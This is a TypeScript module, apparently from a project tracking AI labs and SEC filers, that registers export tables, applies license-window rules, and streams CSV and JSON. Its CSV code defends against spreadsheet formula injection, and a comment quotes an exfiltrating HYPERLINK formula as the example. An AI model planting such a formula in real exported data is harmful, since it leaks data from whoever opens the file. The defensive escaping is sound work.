      'detail',
      'snapshot_id',
      'added',
      'removed',
      'modified',
      'source_url',
    ],
    [tables.sourceRuns.started_at, tables.sourceRuns.id],
    byColumn(tables.sourceRuns.started_at),
    loggedTotal(tables.sourceStats.run_count),
  ),
  entity_securities: staticTable(
    'entity_securities',
    'Each lab and SEC filer we track, mapped to the securities that carry it. Each row has the issuer, CIK, symbol, and exchange as EDGAR lists them, how the lab or filer relates to the security (itself, its parent, a disclosed investor), and the row’s source. A private lab with no security has a row saying so.',
    ENTITY_SECURITY_COLUMNS,
    ENTITY_SECURITIES,
    'it’s a hand-checked table kept in code, and each row is dated by its checked_on.',
  ),
  entity_identifiers: staticTable(
    'entity_identifiers',
    'One row per company we name: each lab, each SEC filer we read, and each comparison company. Each row has the legal name, country, CIK, LEI, and for a listed company its ticker, MIC, and FIGI. Every identifier has the URL and time we read it. entity_id is the value of every provider and company column, so this is the table to join on.',
    ENTITY_IDENTIFIER_COLUMNS,
    ENTITY_IDENTIFIERS,
    'it’s a registry kept in code, and each identifier is dated by its own fetched_at.',
  ),
}

export const EXPORT_TABLE_NAMES = Object.keys(EXPORT_TABLES)

/**
 * The tables read from Internet Archive copies (terminal-archive.ts). They
 * answer as_of by when the Archive saw the page, so an instant before our
 * first snapshot is not refused, and no paid license relabels them.
 */
export const ARCHIVED_EXPORTS: ReadonlySet<string> = new Set([
  'archived_prices',
  'archived_hiring',
  'archive_captures',
])

// ---- the license window ----------------------------------------------------

/** A table of current rows or a lookup: every export serves all of it. */
export interface WholeRule {
  kind: 'whole'
  /** Why it isn't cut by age, for the data dictionary. */
  why: string
  /** When a row first appeared here, for labeling a rebuild older than the window. Null where as_of is refused. */
  published: string | null
}

/** A table that grows over time: the default export is the rows dated inside the window. */
export interface WindowedRule {
  kind: 'windowed'
  /** The row's own date: the first of these columns that isn't null. */
  dated: readonly [string, ...string[]]
  /** What that date is, in the dictionary's words. */
  basis: string
  /** When the row first appeared here (rowLicense). */
  published: string
  /** `dated[0]` as a column, so the window is a SQL condition; without it rows are filtered as they stream. */
  column?: SQLiteColumn
}

export type HistoryRule = WholeRule | WindowedRule

const whole = (why: string, published: string | null = 'first_seen_at'): WholeRule => ({
  kind: 'whole',
  why,
  published,
})

const windowed = (
  dated: readonly [string, ...string[]],
  basis: string,
  published: string,
  column?: SQLiteColumn,
): WindowedRule => ({ kind: 'windowed', dated, basis, published, column })

/**
 * Every export table's license-window rule. Current-state and reference
 * tables stay whole; a log, an observation series, or a list of dated events
 * is windowed on its natural date. layers/terminal/test/terminal-dictionary.test.ts
 * fails when a table has no rule or a rule names a column the table lacks.
 */
export const EXPORT_HISTORY: Readonly<Record<string, HistoryRule>> = {
  snapshots: windowed(
    ['fetched_at'],
    'fetched_at, when we read the page',
    'fetched_at',
    tables.snapshots.fetched_at,
  ),
  prices_latest: whole('it holds one current row per SKU.'),
  jobs_open: whole('it holds the roles listed now.'),
  incidents: windowed(
    ['started_at', 'first_seen_at'],
    'started_at, when the incident began (first_seen_at where the feed gives no start)',
    'first_seen_at',
  ),
  disclosures: windowed(
    ['listed_on', 'first_seen_at'],
    'listed_on, the date the index prints (first_seen_at where it prints none)',
    'first_seen_at',
  ),
  disclosure_timelines: windowed(
    ['disclosed_on', 'discovered_on', 'first_seen_at'],
    'disclosed_on, else discovered_on, else first_seen_at',
    'first_seen_at',
  ),
  filers: whole('it’s a lookup of one CIK per lab.'),
  revenue_facts: windowed(['end'], 'end, the period end', 'first_seen_at'),
  prospectus_statements: windowed(['filed'], 'filed, the filing date', 'first_seen_at'),
  prospectus_commitments: windowed(['filed'], 'filed, the filing date', 'first_seen_at'),
  prospectus_concentration: windowed(['filed'], 'filed, the filing date', 'first_seen_at'),
  prospectus_shares: windowed(['filed'], 'filed, the filing date', 'first_seen_at'),
  prospectus_risk_factors: windowed(['filed'], 'filed, the filing date', 'first_seen_at'),
  changes: windowed(
    ['detected_at'],
    'detected_at, when we saw the change',
    'detected_at',
    tables.changes.detected_at,
  ),
  archived_prices: windowed(
    ['captured_at'],
    'captured_at, when the Internet Archive saw the page',
    'fetched_at',
    tables.archivedPrices.captured_at,
  ),
  archived_hiring: windowed(
    ['captured_at'],
    'captured_at, when the Internet Archive saw the board',
    'fetched_at',
    tables.archivedHiring.captured_at,
  ),
  archive_captures: windowed(
    ['captured_at'],
    'captured_at, when the Internet Archive saw the page',
    'fetched_at',
    tables.archiveCaptures.captured_at,
  ),
  alerts: windowed(
    ['created_at'],
    'created_at, when the alert was written',
    'created_at',
    tables.alerts.created_at,
  ),
  claim_readings: windowed(
    ['date'],
    'date, the data date',
    'computed_at',
    tables.claimReadings.date,
  ),
  claim_verdicts: windowed(
    ['detected_at'],
    'detected_at, when we saw the change it rates',
    'judged_at',
    tables.claimVerdicts.detected_at,
  ),
  track_record_candidates: windowed(
    ['found_at'],
    'found_at, when we found the article',
    'found_at',
    tables.trackRecordCandidates.found_at,
  ),
  track_record_verdicts: windowed(
    ['judged_at'],
    'judged_at, when the judge rated it',
    'judged_at',
    tables.trackRecordVerdicts.judged_at,
  ),
  reported_articles: windowed(
    ['found_at'],
    'found_at, when we found the article',
    'found_at',
    tables.reportedArticles.found_at,
  ),
  reported_figures: windowed(
    ['judged_at'],
    'judged_at, when the judge labeled it',
    'judged_at',
    tables.reportedFigures.judged_at,
  ),
  recipe_observations: windowed(
    ['date'],
    'date, the date the value is for',
    'first_seen_at',
    tables.recipeObservations.date,
  ),
  filed_facts: windowed(['end'], 'end, the period end', 'first_seen_at', tables.filedFacts.end),
  exposure_quarters: windowed(['end'], 'end, the period end', 'fetched_at'),
  source_runs: windowed(
    ['started_at'],
    'started_at, when the check ran',
    'started_at',
    tables.sourceRuns.started_at,
  ),
  entity_securities: whole('it’s a hand-checked lookup of labs to securities.', null),
  entity_identifiers: whole('it’s a lookup of one row per company.', null),
}

/** The license window's rule for a registered table. */
export function historyRule(name: string): HistoryRule {
  const rule = EXPORT_HISTORY[name]
  if (!rule) throw new Error(`no license-window rule for export ${name}`)
  return rule
}

/** A row's own date under its table's rule, or null when every dated column is empty. */
export function rowDate(rule: WindowedRule, row: Row): string | null {
  for (const column of rule.dated) {
    const value = row[column]
    if (value !== null && value !== undefined && value !== '') return String(value)
  }
  return null
}

/**
 * The table cut to rows dated on or after `from` (licenseWindowStart): what a
 * bulk export serves without `?history=full`. A row with no date at all is
 * kept, since nothing says it is old.
 */
export function windowOf(table: ExportTable, rule: HistoryRule, from: string): ExportTable {
  if (rule.kind === 'whole') return table
  const { column } = rule
  const keep = (row: Row) => {
    const dated = rowDate(rule, row)
    return dated === null || dated >= from
  }
  return {
    ...table,
    async page(db, after, limit, where) {
      if (column) return table.page(db, after, limit, and(where, gte(column, from)))
      // Not a column of its own (a payload field, a built row): filter each
      // page, resuming after the last row read, until one is full.
      const out: Row[] = []
      let cursor = after
      for (;;) {
        const rows = await table.page(db, cursor, limit, where)
        for (const row of rows) {
          if (!keep(row)) continue
          out.push(row)
          if (out.length === limit) return out
        }
        if (rows.length < limit) return out
        cursor = rows.at(-1)!
      }
    },
    count: () => Promise.reject(new Error('not counted for a window')),
  }
}

/** The column a full-history export adds, just before source_url. */
export const LICENSE_COLUMN = 'license'

/** The columns of `table` with LICENSE_COLUMN before source_url. */
export function licensedColumns(columns: readonly string[]): string[] {
  const at = columns.indexOf('source_url')
  return [...columns.slice(0, at), LICENSE_COLUMN, ...columns.slice(at)]
}

/** Every row of `table`, each labeled with the SPDX id `licenseOf` gives it. */
export function licensedOf(table: ExportTable, licenseOf: (row: Row) => string): ExportTable {
  const columns = licensedColumns(table.columns)
  return {
    ...table,
    columns,
    async page(db, after, limit, where) {
      const rows = await table.page(db, after, limit, where)
      return rows.map((row) => project({ ...row, [LICENSE_COLUMN]: licenseOf(row) }, columns))
    },
  }
}

export type HistoryQuery = 'recent' | 'full'

/** `as_of` and `history` (recent, the default, or full), for getValidatedQuery. */
export function parseExportQuery(query: unknown): { as_of?: string; history?: HistoryQuery } {
  const history = (query as Record<string, unknown> | null)?.[HISTORY_PARAM]
  if (history !== undefined && history !== 'recent' && history !== 'full') {
    throw new PointInTimeError(`${HISTORY_PARAM} must be recent (the default) or full`)
  }
  return { ...parseAsOfQuery(query), ...(history === undefined ? {} : { history }) }
}

export interface LicenseWindow {
  table: ExportTable
  /** The first day of the window (licenseWindowStart). */
  from: string
  /** The default export of a table that grows, cut to the window. */
  windowed: boolean
  /** Rows older than the window may be in it, each labeled in LICENSE_COLUMN. */
  split: boolean
  /** What those older rows are labeled: HISTORY_LICENSE, or PAID_LICENSE for a licensee's key. */
  older: LicenseRef
}

/**
 * Apply the license window to `table` (already rebuilt at `as_of`, if asked):
 *
 * - a windowed table serves the rows dated inside the window, or every row
 *   with its license when `history=full`. An `as_of` before the window has no
 *   rows inside it, so without `history=full` it is a PointInTimeError.
 * - a whole table is served whole. Rebuilt at an `as_of` before the window it
 *   is older data, and its rows are labeled the same way.
 */
export function licenseWindow(
  name: string,
  table: ExportTable,
  query: { as_of?: string; history?: HistoryQuery },
  from: string = licenseWindowStart(),
  requested: LicenseRef = HISTORY_LICENSE,
): LicenseWindow {
  const rule = historyRule(name)
  // A licensee's key never relabels these: they were read from the Internet
  // Archive, whose terms grant access for scholarship and research
  // (sources.yaml › archive_sources › wayback-pricing, rights not-cleared).
  const older = ARCHIVED_EXPORTS.has(name) ? HISTORY_LICENSE : requested
  const label = (dated: (row: Row) => string | null) =>
    licensedOf(table, (row) => {
      const published = rule.published === null ? null : row[rule.published]
      return rowLicense(dated(row), typeof published === 'string' ? published : null, from, older)
        .id
    })

  const { as_of } = query
  if (rule.kind === 'whole') {
    if (as_of === undefined || as_of >= from)
      return { table, from, windowed: false, split: false, older }
    return { table: label(() => as_of), from, windowed: false, split: true, older }
  }
  if (query.history === 'full') {
    return { table: label((row) => rowDate(rule, row)), from, windowed: false, split: true, older }
  }
  if (as_of !== undefined && as_of < from) {
    throw new PointInTimeError(
      `as_of ${as_of} is before ${from}, the start of the trailing ${LICENSE_WINDOW_DAYS} days, which is all /export/${name} serves by default. Add ${HISTORY_PARAM}=full for the full history, licensed ${HISTORY_LICENSE.short} for our compilation (see /license).`,
    )
  }
  return { table: windowOf(table, rule, from), from, windowed: true, split: false, older }
}

/**
 * The license as HTTP headers, so it reaches a client that never opens the
 * body: a `Link rel=license` (RFC 4946) to each license that applies, and the
 * window the rows were cut to.
 */
export function licenseHeaders(window: LicenseWindow): Record<string, string> {
  if (window.split) {
    return {
      Link: `<${window.older.url}>; rel="license", <${DATA_LICENSE.url}>; rel="license", </license>; rel="terms-of-service"`,
      'X-License': `${window.older.id} for rows dated before ${window.from} that we first published on or after ${LICENSE_SPLIT_EFFECTIVE}, ${DATA_LICENSE.id} for the rest. The ${LICENSE_COLUMN} column labels each row.`,
    }
  }
  return {
    Link: `<${DATA_LICENSE.url}>; rel="license", </license>; rel="terms-of-service"`,
    'X-License': DATA_LICENSE.id,
    ...(window.windowed
      ? {
          'X-History': `Rows dated on or after ${window.from}, the trailing ${LICENSE_WINDOW_DAYS} days. Add ?${HISTORY_PARAM}=full for every row.`,
        }
      : {}),
  }
}

/** Rows in a sample file: the first rows of the table in export order, oldest first where the key is a time. */
export const SAMPLE_ROWS = 50

/** The same table cut to its first SAMPLE_ROWS rows, for /export/sample/<table>.<format>. */
export function sampleOf(table: ExportTable): ExportTable {
  return {
    ...table,
    filters: undefined,
    async page(db, after, _limit, where) {
      return after === null ? table.page(db, null, SAMPLE_ROWS, where) : []
    },
    async count(db) {
      return Math.min(SAMPLE_ROWS, await table.count(db))
    },
    async at(db, at) {
      return sampleOf(await table.at(db, at))
    },
  }
}

export function exportTable(name: string): ExportTable | null {
  return Object.prototype.hasOwnProperty.call(EXPORT_TABLES, name) ? EXPORT_TABLES[name]! : null
}

export type ExportFormat = 'csv' | 'json'

/**
 * `<table>.<format>` off a request path. The route files are named
 * `[table].csv.get.ts` and `[table].json.get.ts`, but a router param cannot
 * own half a segment: Nitro registers both as catch-alls over `/export/x`
 * and whichever registered first answers every request. So neither the
 * table nor the format is trusted to the router — both are read here, and
 * either route file serves either format correctly.
 */
export function parseExportPath(path: string): { name: string; format: ExportFormat } | null {
  const file = path.split('?')[0]!.split('/').pop() ?? ''
  const match = file.match(/^([a-z_]+)\.(csv|json)$/)
  return match ? { name: match[1]!, format: match[2] as ExportFormat } : null
}

// ---- CSV -------------------------------------------------------------------

/**
 * Characters a spreadsheet reads as "this cell is a formula" when they lead.
 * Tab and carriage return are here because Excel skips leading whitespace
 * before deciding, so `\t=cmd` is a formula too.
 */
const FORMULA_LEAD = /^[=+@\t\r]/

/** A cell that is just a number. `-3.5e4` leads with `-` and is not a formula. */
const PLAIN_NUMBER = /^-?\d+(\.\d+)?([eE][+-]?\d+)?$/

/**
 * Defuse a cell a spreadsheet would execute.
 *
 * These exports are meant to be opened in Excel or Sheets — that is what
 * `Content-Disposition: attachment` is for — and the strings in them are not
 * ours: job titles, incident titles, vendor price notes and judge-written
 * headlines all originate outside this Worker. A cell beginning `=`, `+`, `@`
 * or `-` is a formula there, and `=HYPERLINK("https://…"&A1,"x")` exfiltrates
 * the row on open, with no macro prompt and no warning.
 *
 * A leading apostrophe is the standard defusal: the spreadsheet treats the
 * rest as literal text. It is visible in the cell, which is a real cost for a
 * project that exports verbatim source data — so it is spent only where a
 * value would otherwise be executed, and never on a plain number, which is
 * the one case where a leading `-` is data rather than a fuse.
 */
export function defuseFormula(text: string): string {
  if (FORMULA_LEAD.test(text)) return `'${text}`
  if (text.startsWith('-') && !PLAIN_NUMBER.test(text)) return `'${text}`
  return text
}

/** RFC 4180: quote when the value carries a comma, a quote, or a line break.
 * A list (an incident's components) is one JSON cell, not a comma-joined string
 * that a spreadsheet would split. Formula leads are defused first — see
 * defuseFormula — so quoting never wraps a cell the reader would execute. */
export function csvCell(value: unknown): string {
  if (value === null || value === undefined) return ''
  const text = defuseFormula(
    typeof value === 'string'
      ? value
      : typeof value === 'object'
        ? JSON.stringify(value)
        : String(value),
  )
  return /[",\r\n]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text
}

export function csvLine(values: readonly unknown[]): string {
  return `${values.map(csvCell).join(',')}\r\n`
}

// ---- streaming -------------------------------------------------------------

/** Every row of `table` in export order, a page at a time. */
export async function* exportPages(
  db: PipelineDb,
  table: ExportTable,
  where?: SQL,
  pageSize: number = EXPORT_PAGE_SIZE,
): AsyncGenerator<Row[]> {
  let after: Row | null = null
  for (;;) {
    const rows = await table.page(db, after, pageSize, where)
    if (rows.length === 0) return
    yield rows
    if (rows.length < pageSize) return
    after = rows.at(-1)!
  }
}

export async function* csvChunks(
  db: PipelineDb,
  table: ExportTable,
  where?: SQL,
): AsyncGenerator<string> {
  yield csvLine(table.columns)
  for await (const rows of exportPages(db, table, where)) {
    yield rows.map((row) => csvLine(table.columns.map((c) => row[c]))).join('')
  }
}

export async function* jsonChunks(
  db: PipelineDb,
  table: ExportTable,
  where?: SQL,
): AsyncGenerator<string> {
  yield '[\n'
  let first = true
  for await (const rows of exportPages(db, table, where)) {
    const body = rows.map((row) => JSON.stringify(row)).join(',\n')
    yield `${first ? '' : ',\n'}${body}`
    first = false
  }
  yield '\n]\n'
}

/**
 * jsonChunks inside an object: `head`'s fields, then the rows under `rows`.
 * A full-history export is served this way so its license travels in the file.
 */
export async function* jsonEnvelopeChunks(
  db: PipelineDb,
  table: ExportTable,
  where: SQL | undefined,
  head: Record<string, unknown>,
): AsyncGenerator<string> {
  yield `${JSON.stringify(head).slice(0, -1)},"rows":`
  yield* jsonChunks(db, table, where)
  yield '}\n'
}

/** A byte stream over text chunks; the generator is closed if the reader goes away. */
export function streamOf(chunks: AsyncGenerator<string>): ReadableStream<Uint8Array> {
  const encoder = new TextEncoder()
  return new ReadableStream<Uint8Array>({
    async pull(controller) {
      const { value, done } = await chunks.next()
      if (done) controller.close()
      else controller.enqueue(encoder.encode(value))
    },
    async cancel() {
      await chunks.return(undefined)
    },
  })
}

/** Everything the stream yielded, joined — for tests and small exports. */
export async function collect(chunks: AsyncGenerator<string>): Promise<string> {
  let out = ''
  for await (const chunk of chunks) out += chunk
  return out
}
